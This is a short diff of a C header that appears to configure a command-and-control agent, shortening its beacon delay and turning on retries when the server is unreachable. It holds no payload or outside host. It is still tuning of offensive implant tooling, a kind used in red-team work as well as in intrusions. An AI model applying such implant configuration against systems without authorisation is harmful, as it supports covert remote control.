@@ -14,11 +14,11 @@
 
 //agent info
 #define AGENT_HANDLE "myagent"
-#define DEFAULT_DELAY_S 8
+#define DEFAULT_DELAY_S 3
 #define DEFAULT_DELAY_NS 0
 #define DEFAULT_JITTER_S 0
 #define DEFAULT_JITTER_NS 0
 
-//#define MAX_FAIL_RETRY 5
+#define MAX_FAIL_RETRY 5 //retry sending beacons if the server is unreachable
 
 #endif //C2_AGENT_CONFIG_H
